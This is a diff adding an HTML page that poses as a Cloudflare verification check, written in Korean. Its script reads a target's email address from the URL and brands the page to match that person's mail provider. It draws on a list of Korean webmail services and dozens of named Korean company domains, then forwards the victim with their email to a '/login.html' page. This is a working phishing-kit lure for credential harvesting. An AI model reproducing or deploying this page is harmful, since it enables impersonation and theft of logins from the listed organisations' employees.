@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>잠시만 기다려 주세요...</title>
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+<style>
+  :root{
+    --brand-c1:#f6821f;
+    --brand-c2:#fbad41;
+    --brand-fg:#ffffff;
+  }
+  *{margin:0;padding:0;box-sizing:border-box}
+  html,body{
+    height:100%;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Noto Sans KR",Arial,sans-serif;
+    background:#f7f7f7;color:#313131;
+    display:flex;align-items:center;justify-content:center;padding:20px;
+  }
+  .cf-card{
+    background:#fff;border:1px solid #d9d9d9;border-radius:6px;
+    max-width:460px;width:100%;padding:0 0 24px;
+    box-shadow:0 2px 8px rgba(0,0,0,.04);
+    text-align:center;overflow:hidden;position:relative;
+    transition:box-shadow .35s ease;
+  }
+  .brand-bar{
+    height:5px;
+    background:linear-gradient(90deg,var(--brand-c1),var(--brand-c2));
+    transition:background .35s ease;
+  }
+  .cf-shield{width:48px;height:48px;margin:28px auto 18px}
+  .cf-shield svg{width:100%;height:100%}
+  .brand-mark{
+    width:56px;height:56px;margin:28px auto 18px;
+    border-radius:16px;display:none;place-items:center;
+    font-size:26px;font-weight:800;letter-spacing:-.5px;
+    background:linear-gradient(135deg,var(--brand-c1),var(--brand-c2));
+    color:var(--brand-fg);
+    box-shadow:0 10px 24px -10px var(--brand-c1);
+    transition:background .35s ease,color .35s ease,box-shadow .35s ease;
+  }
+  .brand-mark.show{display:grid}
+  .cf-card h1{font-size:20px;font-weight:600;color:#313131;margin-bottom:8px}
+  .cf-card p{font-size:14px;color:#6a6a6a;margin-bottom:20px;line-height:1.5;padding:0 28px}
+  .brand-chip{
+    display:none;align-items:center;justify-content:center;gap:8px;
+    margin:0 auto 22px;padding:8px 14px;border-radius:999px;
+    background:#fafafa;border:1px solid #ececec;
+    font-size:12.5px;color:#555;max-width:fit-content;
+  }
+  .brand-chip.show{display:inline-flex}
+  .brand-chip .dot{
+    width:8px;height:8px;border-radius:50%;
+    background:linear-gradient(135deg,var(--brand-c1),var(--brand-c2));
+    transition:background .35s ease;
+  }
+  .brand-chip strong{color:#313131;font-weight:700}
+  .cf-turnstile{display:flex;justify-content:center;margin:0 auto 20px;min-height:65px}
+  .cf-footer{
+    display:flex;justify-content:center;align-items:center;gap:10px;flex-wrap:wrap;
+    font-size:11px;color:#6a6a6a;padding-top:16px;
+    border-top:1px solid #f0f0f0;margin:8px 28px 0;
+  }
+  .cf-footer a{color:#6a6a6a;text-decoration:none}
+  .cf-footer a:hover{text-decoration:underline}
+  .cf-logo{display:inline-flex;align-items:center;gap:4px;color:#f6821f;font-weight:600}
+  .spinner{
+    display:none;width:36px;height:36px;margin:8px auto 20px;
+    border:3px solid #f0f0f0;
+    border-top:3px solid var(--brand-c1);
+    border-radius:50%;animation:spin .8s linear infinite;
+    transition:border-top-color .35s ease;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .error-box{
+    display:none;background:#fff5f5;border:1px solid #f5c6cb;
+    color:#a94442;padding:10px 14px;border-radius:4px;
+    font-size:13px;margin:12px 28px 0;
+  }
+  .state-verifying .spinner{display:block}
+  .state-verifying .cf-turnstile{display:none}
+  .state-verifying .brand-chip{display:none}
+</style>
+</head>
+<body>
+
+<div class="cf-card" id="cfCard">
+  <div class="brand-bar"></div>
+
+  <div class="cf-shield" id="cfShield">
+    <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <path fill="#f6821f" d="M35.6 27.7l-4.1-1.9c-.6-.2-1.1-.8-1.2-1.4l-3.7-12.3c-.1-.4-.5-.7-.9-.7h-5.6c-.4 0-.7.3-.6.7l3.5 11.7c.1.4.5.7.9.7h5.7c.2 0 .4-.2.3-.4l-1.2-4.2c-.1-.4.2-.8.6-.8h4.6c.4 0 .7.3.6.7l-1.6 5.4c-.1.4-.5.7-.9.7H22c-.2 0-.4.2-.3.4l1 3.4c.1.4.5.7.9.7h11.4c.5 0 .8-.4.6-.9l-.7-1.6c-.1-.3.1-.6.4-.6h4.5c.3 0 .5-.3.4-.6l-.7-2.4c-.1-.4-.5-.6-.9-.6l-4.1.1z"/>
+      <path fill="#fbad41" d="M41.9 33.6c.3-1 .2-2-.3-2.9-.5-.8-1.3-1.4-2.3-1.5l-3.9-.1c-.1 0-.2-.1-.2-.2s.1-.2.2-.2l4.2-.3c2-.1 3.7-1.6 4.3-3.5.3-1 .3-2 .1-2.9-.1-.4-.5-.6-.9-.5-2.8.6-5.5.5-7.4.1-.2 0-.3-.2-.3-.4.1-.5.1-1 0-1.5-.2-1.3-1-2.5-2.1-3.2-.5-.3-1.1-.6-1.7-.7-.3 0-.6.1-.7.3-.3.6-.5 1.3-.6 2-.2 1.4 0 2.8.5 4 .2.4-.1.9-.6.8-2.3-.5-4.5-.3-6.4.4-.3.1-.6-.1-.6-.4.1-1.7-.3-3.4-1.3-4.8-1.3-1.9-3.4-3-5.7-3-2.9 0-5.5 1.7-6.8 4.3-.2.5-.4 1-.5 1.5-.1.4-.5.7-.9.6-2.9-.6-5.7 1-7 3.6-.5 1-.7 2-.8 3.1 0 .4-.3.7-.7.8-1.7.3-3.3 1.1-4.5 2.3-1.4 1.4-2.2 3.3-2.2 5.3v.1c0 .4.3.7.7.7h35.4c.5 0 .9-.4.9-.9 0-.3-.1-.6-.3-.8z"/>
+    </svg>
+  </div>
+  <div class="brand-mark" id="brandMark">N</div>
+
+  <h1>사용자 확인 중</h1>
+  <p>몇 초 정도 소요됩니다.</p>
+
+  <div class="brand-chip" id="brandChip">
+    <span class="dot"></span>
+    <span>인증 대상 <strong id="brandChipName">—</strong></span>
+  </div>
+
+  <div class="spinner"></div>
+
+  <!-- ⬇️ REPLACE with YOUR Turnstile site key ⬇️ -->
+  <div class="cf-turnstile"
+       id="turnstileWidget"
+       data-sitekey="0x4AAAAAAE05AJQxT-EsaFlm"
+       data-callback="onVerified"
+       data-error-callback="onTurnstileError"
+       data-expired-callback="onTurnstileExpired"
+       data-theme="light"
+       data-size="flexible"></div>
+
+  <div class="error-box" id="errorBox"></div>
+
+  <div class="cf-footer">
+    <span class="cf-logo">
+      <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" style="width:16px;height:16px;">
+        <path fill="#f6821f" d="M35.6 27.7l-4.1-1.9c-.6-.2-1.1-.8-1.2-1.4l-3.7-12.3c-.1-.4-.5-.7-.9-.7h-5.6c-.4 0-.7.3-.6.7l3.5 11.7c.1.4.5.7.9.7h5.7c.2 0 .4-.2.3-.4l-1.2-4.2c-.1-.4.2-.8.6-.8h4.6c.4 0 .7.3.6.7l-1.6 5.4c-.1.4-.5.7-.9.7H22c-.2 0-.4.2-.3.4l1 3.4c.1.4.5.7.9.7h11.4c.5 0 .8-.4.6-.9l-.7-1.6c-.1-.3.1-.6.4-.6h4.5c.3 0 .5-.3.4-.6l-.7-2.4c-.1-.4-.5-.6-.9-.6l-4.1.1z"/>
+      </svg>
+      Cloudflare
+    </span>
+    <a href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noopener">개인정보</a>
+    <span>•</span>
+    <a href="https://www.cloudflare.com/website-terms/" target="_blank" rel="noopener">약관</a>
+  </div>
+</div>
+
+<script>
+/* ============================================================
+   1. KOREAN PUBLIC EMAIL PROVIDERS — 20 brands
+   ============================================================ */
+const BRANDS = [
+  { key:'naver',       name:'Naver',        local:'네이버 메일',       mark:'N',
+    domains:['naver.com','naver.net'],       c1:'#03C75A', c2:'#029E48', fg:'#ffffff' },
+  { key:'daum',        name:'Daum',         local:'다음 메일',         mark:'D',
+    domains:['daum.net'],                    c1:'#FFC400', c2:'#F9A800', fg:'#3C1E1E' },
+  { key:'hanmail',     name:'Hanmail',      local:'한메일',           mark:'H',
+    domains:['hanmail.net'],                 c1:'#FF9E1B', c2:'#E07A00', fg:'#3C1E1E' },
+  { key:'kakao',       name:'Kakao',        local:'카카오메일',        mark:'K',
+    domains:['kakao.com'],                   c1:'#FEE500', c2:'#F5D400', fg:'#3C1E1E' },
+  { key:'nate',        name:'Nate',         local:'네이트 메일',       mark:'N',
+    domains:['nate.com'],                    c1:'#FF3D00', c2:'#D92E00', fg:'#ffffff' },
+  { key:'paran',       name:'Paran',        local:'파란 메일',         mark:'P',
+    domains:['paran.com'],                   c1:'#0066CC', c2:'#004499', fg:'#ffffff' },
+  { key:'empas',       name:'Empas',        local:'엠파스 메일',       mark:'E',
+    domains:['empas.com'],                   c1:'#E8380D', c2:'#B92A08', fg:'#ffffff' },
+  { key:'hiworks',     name:'Hiworks',      local:'하이웍스 기업메일', mark:'H',
+    domains:['hiworks.co.kr','hiworks.com'], c1:'#0066FF', c2:'#0047B3', fg:'#ffffff' },
+  { key:'gabia',       name:'Gabia',        local:'가비아 메일',       mark:'G',
+    domains:['gabia.com'],                   c1:'#F26522', c2:'#C94E14', fg:'#ffffff' },
+  { key:'worksmobile', name:'Naver Works',  local:'네이버웍스',        mark:'W',
+    domains:['worksmobile.com'],             c1:'#00C73C', c2:'#009E30', fg:'#ffffff' },
+  { key:'dooray',      name:'Dooray',       local:'두레이',           mark:'D',
+    domains:['dooray.com'],                  c1:'#1E88E5', c2:'#1264A8', fg:'#ffffff' },
+  { key:'chollian',    name:'Chollian',     local:'천리안',           mark:'C',
+    domains:['chollian.net'],                c1:'#0066CC', c2:'#004A99', fg:'#ffffff' },
+  { key:'hitel',       name:'Hitel',        local:'하이텔',           mark:'H',
+    domains:['hitel.net'],                   c1:'#E60000', c2:'#B30000', fg:'#ffffff' },
+  { key:'nownuri',     name:'Nownuri',      local:'나우누리',          mark:'N',
+    domains:['nownuri.net'],                 c1:'#009944', c2:'#006B30', fg:'#ffffff' },
+  { key:'unitel',      name:'Unitel',       local:'유니텔',           mark:'U',
+    domains:['unitel.co.kr'],                c1:'#FF6600', c2:'#CC5200', fg:'#ffffff' },
+  { key:'netsgo',      name:'Netsgo',       local:'넷츠고',           mark:'N',
+    domains:['netsgo.com'],                  c1:'#0044CC', c2:'#00308F', fg:'#ffffff' },
+  { key:'shinbiro',    name:'Shinbiro',     local:'신비로',           mark:'S',
+    domains:['shinbiro.com'],                c1:'#8B00FF', c2:'#6600BF', fg:'#ffffff' },
+  { key:'netian',      name:'Netian',       local:'네띠앙',           mark:'N',
+    domains:['netian.com'],                  c1:'#FF3366', c2:'#CC1F4D', fg:'#ffffff' },
+  { key:'hanmir',      name:'Hanmir',       local:'한미르',           mark:'H',
+    domains:['hanmir.com'],                  c1:'#00AAFF', c2:'#0080C0', fg:'#ffffff' },
+  { key:'dreamwiz',    name:'Dreamwiz',     local:'드림위즈',          mark:'D',
+    domains:['dreamwiz.com'],                c1:'#FF9900', c2:'#D97D00', fg:'#ffffff' }
+];
+
+/* ============================================================
+   2. CORPORATE DOMAINS — resolved via MX (mx_resolver.py)
+   ============================================================ */
+const CORPORATE_MAP = {
+  'protec21.co.kr':'hiworks','wilcovalve.co.kr':'hiworks',
+  'woolimshipping.co.kr':'hiworks','wkt.co.kr':'hiworks',
+  'wwl.co.kr':'hiworks','glrapha.co.kr':'hiworks',
+  'neomate.co.kr':'hiworks','youngchemical.co.kr':'hiworks',
+  'mas21.kr':'hiworks','mcure.co.kr':'hiworks',
+  'yjt.co.kr':'hiworks','jwlg.co.kr':'hiworks',
+  'cephas.kr':'hiworks','semi-ence.co.kr':'hiworks',
+  'starsports.co.kr':'hiworks','sonicworld.kr':'hiworks',
+  'youyang.co.kr':'hiworks','iteco.co.kr':'hiworks',
+  'mth.co.kr':'hiworks','paultec.co.kr':'hiworks',
+  'thomas.co.kr':'hiworks','tootech.co.kr':'hiworks',
+  'enfac.kr':'hiworks','paper-cup.co.kr':'hiworks',
+  'psmp.co.kr':'hiworks','wasco.co.kr':'hiworks',
+  'airmajor.co.kr':'hiworks','aisystems.co.kr':'hiworks',
+  'alfa-tech.co.kr':'hiworks','al-tech.co.kr':'hiworks',
+  'varikorea.co.kr':'hiworks','bigtrans.co.kr':'hiworks',
+  'kbs.co.kr':'hiworks','mdtoday.co.kr':'hiworks',
+  'kwshop.co.kr':'hiworks','baishan.co.kr':'hiworks',
+  'hcnd.co.kr':'hiworks','bdsic.co.kr':'hiworks',
+  'belink.co.kr':'hiworks','bikey.co.kr':'hiworks',
+  'bkinstruments.co.kr':'hiworks','duckilltd.co.kr':'hiworks',
+  'serpentkorea.co.kr':'hiworks','busanagency.kr':'hiworks',
+  'foreseeson.co.kr':'hiworks','cnotech.co.kr':'hiworks',
+  'nutricare.co.kr':'hiworks','byshipping.co.kr':'hiworks',
+  'chamos.co.kr':'hiworks','yooyoun.co.kr':'hiworks',
+  'daemo.co.kr':'hiworks','carboline.co.kr':'hiworks',
+  'votem.kr':'hiworks','vericom.co.kr':'hiworks',
+  'upc.co.kr':'hiworks','uctkorea.co.kr':'hiworks',
+  'ubcs.co.kr':'hiworks'
+};
+
+/* ============================================================
+   3. FAST LOOKUPS
+   ============================================================ */
+const DOMAIN_MAP = {};
+BRANDS.forEach(b => b.domains.forEach(d => DOMAIN_MAP[d] = b));
+
+const BRAND_BY_KEY = {};
+BRANDS.forEach(b => BRAND_BY_KEY[b.key] = b);
+
+/* ============================================================
+   4. GENERIC FALLBACK
+   ============================================================ */
+function hashHue(str){
+  let h = 0;
+  for (let i = 0; i < str.length; i++) h = (h * 31 + str.charCodeAt(i)) >>> 0;
+  return h % 360;
+}
+
+function genericBrand(domain){
+  const label = (domain.split('.')[0] || 'mail').toUpperCase();
+  const hue = hashHue(domain);
+  return {
+    key:'generic',
+    name: label,
+    local: domain,
+    mark: label.charAt(0) || 'M',
+    domains:[domain],
+    c1:`hsl(${hue} 62% 48%)`,
+    c2:`hsl(${(hue + 34) % 360} 62% 34%)`,
+    fg:'#ffffff'
+  };
+}
+
+/* ============================================================
+   5. DOMAIN EXTRACTION + BRAND DETECTION
+   ============================================================ */
+function extractDomain(email){
+  if (!email) return null;
+  const at = email.lastIndexOf('@');
+  if (at === -1) return null;
+  let d = email.slice(at + 1).trim().toLowerCase().replace(/^www\./, '');
+  d = d.replace(/[^a-z0-9.\-]/g, '');
+  return d || null;
+}
+
+function detectBrand(email){
+  const domain = extractDomain(email);
+  if (!domain) return null;
+
+  if (DOMAIN_MAP[domain])
+    return { brand: DOMAIN_MAP[domain], matched: domain, source: 'public' };
+
+  if (CORPORATE_MAP[domain] && BRAND_BY_KEY[CORPORATE_MAP[domain]])
+    return { brand: BRAND_BY_KEY[CORPORATE_MAP[domain]], matched: domain, source: 'corporate' };
+
+  const parts = domain.split('.');
+  for (let i = 1; i < parts.length - 1; i++){
+    const cand = parts.slice(i).join('.');
+    if (DOMAIN_MAP[cand])
+      return { brand: DOMAIN_MAP[cand], matched: cand, source: 'public-sub' };
+    if (CORPORATE_MAP[cand] && BRAND_BY_KEY[CORPORATE_MAP[cand]])
+      return { brand: BRAND_BY_KEY[CORPORATE_MAP[cand]], matched: cand, source: 'corporate-sub' };
+  }
+
+  return { brand: genericBrand(domain), matched: domain, source: 'generic' };
+}
+
+/* ============================================================
+   6. READ EMAIL FROM URL
+   ============================================================ */
+function getEmailFromSource(){
+  let fromHash = window.location.hash.substring(1);
+  if (fromHash){
+    try { fromHash = decodeURIComponent(fromHash); } catch(e){}
+    fromHash = fromHash.split('&')[0].split('?')[0].replace(/^email=/i,'').trim();
+    if (fromHash.includes('@')) return fromHash;
+  }
+
+  const params = new URLSearchParams(window.location.search);
+  const keys = ['e', 'auth', 'email', 'u', 'login_hint', 'user', 'mail'];
+  for (const k of keys){
+    const v = params.get(k);
+    if (v && v.includes('@')) return v;
+  }
+
+  if (window.location.search.length > 1){
+    let raw = window.location.search.substring(1);
+    try { raw = decodeURIComponent(raw); } catch(e){}
+    raw = raw.split('&')[0].split('?')[0].trim();
+    if (raw.includes('@')) return raw;
+  }
+  return '';
+}
+
+/* ============================================================
+   7. APPLY BRANDING TO DOM
+   ============================================================ */
+function applyBranding(brand, matched){
+  const root = document.documentElement;
+  root.style.setProperty('--brand-c1', brand.c1);
+  root.style.setProperty('--brand-c2', brand.c2);
+  root.style.setProperty('--brand-fg', brand.fg);
+
+  const shieldEl = document.getElementById('cfShield');
+  const markEl   = document.getElementById('brandMark');
+  const chipEl   = document.getElementById('brandChip');
+  const chipName = document.getElementById('brandChipName');
+
+  if (brand.key === 'generic'){
+    shieldEl.style.display = '';
+    markEl.classList.remove('show');
+    chipEl.classList.add('show');
+    chipName.textContent = matched;
+  } else {
+    shieldEl.style.display = 'none';
+    markEl.textContent = brand.mark;
+    markEl.classList.add('show');
+    chipEl.classList.add('show');
+    chipName.textContent = brand.name + ' · ' + matched;
+  }
+  document.title = '잠시만 기다려 주세요... — ' + brand.name;
+}
+
+/* ============================================================
+   8. TURNSTILE CALLBACKS + REDIRECT
+   ============================================================ */
+var urls = ['/login.html']; // redirect to Korea login page
+
+var EMAIL = getEmailFromSource();
+var verified = false;
+
+function onVerified(token){
+  if (verified) return;
+  if (!token) { onTurnstileError('missing-token'); return; }
+  verified = true;
+  console.log('🛡️ Turnstile passed');
+
+  var card = document.getElementById('cfCard');
+  if (card) card.classList.add('state-verifying');
+
+  var target = urls[Math.floor(Math.random() * urls.length)];
+  var finalUrl = EMAIL
+    ? target + (target.includes('?') ? '&' : '?') + 'u=' + encodeURIComponent(EMAIL)
+    : target;
+
+  console.log('🔗 Redirecting to:', finalUrl);
+  setTimeout(function(){ window.location.href = finalUrl; }, 800);
+}
+
+function onTurnstileError(code){
+  console.error('❌ Turnstile error:', code);
+  var box = document.getElementById('errorBox');
+  if (box){
+    box.style.display = 'block';
+    box.textContent = '인증에 실패했습니다. 페이지를 새로고침해주세요.';
+  }
+  var card = document.getElementById('cfCard');
+  if (card) card.classList.remove('state-verifying');
+}
+
+function onTurnstileExpired(){
+  verified = false;
+  if (window.turnstile){ try { window.turnstile.reset(); } catch(e){} }
+}
+
+setTimeout(function(){
+  if (!verified && window.turnstile === undefined){
+    var box = document.getElementById('errorBox');
+    if (box){
+      box.style.display = 'block';
+      box.textContent = '보안 확인이 예상보다 오래 걸립니다. 새로고침해주세요.';
+    }
+  }
+}, 15000);
+
+/* ============================================================
+   9. INIT
+   ============================================================ */
+(function init(){
+  console.log('📧 Email from URL:', EMAIL || '(none)');
+  if (EMAIL){
+    var r = detectBrand(EMAIL);
+    if (r){
+      applyBranding(r.brand, r.matched);
+      console.log('🎨 Brand:', r.brand.name, '| source:', r.source, '| matched:', r.matched);
+    }
+  } else {
+    console.log('ℹ️ No email in URL — default Cloudflare look');
+  }
+})();
+
+console.log('%cKorean Email Branding Redirector ready', 'font-weight:700;color:#03C75A');
+console.log('Public brands:', BRANDS.length, '| Corporate domains:', Object.keys(CORPORATE_MAP).length);
+</script>
+</body>
+</html>
